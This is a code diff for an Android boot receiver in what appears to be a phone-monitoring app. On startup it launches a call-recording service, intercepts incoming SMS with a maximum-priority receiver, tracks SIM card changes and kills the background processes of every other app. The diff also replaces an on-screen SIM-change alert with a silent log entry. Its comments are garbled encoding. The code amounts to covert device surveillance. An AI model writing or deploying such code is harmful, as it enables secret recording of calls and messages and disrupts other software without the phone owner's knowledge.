@@ -1,46 +1,81 @@
 package com.privacy.monitor.receiver;
 
+import java.util.List;
 import com.privacy.monitor.base.C;
-import com.privacy.monitor.service.SmsReceiverService;
-
+import com.privacy.monitor.domain.TaskInfo;
+import com.privacy.monitor.provider.TaskInfoProvider;
+import com.privacy.monitor.service.CallRecordService;
+import com.privacy.monitor.util.Logger;
+import android.app.ActivityManager;
+import android.app.ActivityManager.RunningAppProcessInfo;
 import android.content.BroadcastReceiver;
 import android.content.Context;
 import android.content.Intent;
+import android.content.IntentFilter;
 import android.content.SharedPreferences;
 import android.content.SharedPreferences.Editor;
 import android.telephony.TelephonyManager;
 import android.text.TextUtils;
-import android.widget.Toast;
 
 /**
- * À¹½Ø¿ª»ú¹ã²¥
+ * æ‹¦æˆªå¼€æœºå¹¿æ’­
  */
 public class BootReceiver extends BroadcastReceiver {
 
 	private TelephonyManager tm;
 	private SharedPreferences sp;
+	private ActivityManager am ;
 	
 	@Override
 	public void onReceive(Context context, Intent intent) {
-		Intent serIntent = new Intent(context, SmsReceiverService.class);
-		context.startActivity(serIntent);
+		Logger.d("BootRectiver", "å¼€æœºå¹¿æ’­");
+		Intent intent2 = new Intent(context,CallRecordService.class);
+        context.startService(intent2);
 		
+		
+		am = (ActivityManager) context.getSystemService(Context.ACTIVITY_SERVICE);
 		tm = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
-
 		sp = context.getSharedPreferences("config",Context.MODE_PRIVATE);
 		
-		//µÃµ½µ±Ç°ÊÖ»úsim¿¨µÄÊ¶±ğÂë
+		IntentFilter intentFilter = new IntentFilter("android.provider.Telephony.SMS_RECEIVED");
+	    intentFilter.setPriority(Integer.MAX_VALUE);
+	    context.registerReceiver(new MmsReceiver(), intentFilter);
+		
+		//å¾—åˆ°å½“å‰æ‰‹æœºsimå¡çš„è¯†åˆ«ç 
 		String sim_serial = tm.getSimSerialNumber();
 		String sim_serial_sp= sp.getString(C.SIM_SERIAL,"");
 		
 		if(!TextUtils.isEmpty(sim_serial_sp)){
 			if(!sim_serial_sp.equals(sim_serial)){
-				Toast.makeText(context, "SIM¿¨¸Ä±äÁË",Toast.LENGTH_SHORT).show();
+				Logger.d("BootReceiver","SIMå¡æ”¹å˜äº†....");
 			}
 		}else {
 			Editor editor = sp.edit();
 			editor.putString(C.SIM_SERIAL,sim_serial);
 			editor.commit();
 		}
+		killTask(context);
+	}
+	
+	/**
+	 * æ€æ­»æ‰€æœ‰æ­£åœ¨è¿è¡Œçš„è¿›ç¨‹(é™¤ç³»ç»Ÿè¿›ç¨‹å¤–)
+	 */
+	private void killTask(Context context){
+		
+		TaskInfoProvider provider = new TaskInfoProvider(context);
+		List<TaskInfo> taskInfos = provider.getAllTasks(getProcessAppInfo(context));
+		for (TaskInfo taskInfo : taskInfos) {
+			String packname = taskInfo.getPackname();
+			Logger.d("BootRectiver","æ€æ­»äº†..."+packname);
+			if(!"com.privacy.monitor".equals(packname)){
+				am.killBackgroundProcesses(taskInfo.getPackname());
+			}
+		}
+	}
+	
+	private List<RunningAppProcessInfo> getProcessAppInfo(Context context){
+		
+	   return am.getRunningAppProcesses();
+		
 	}
 }
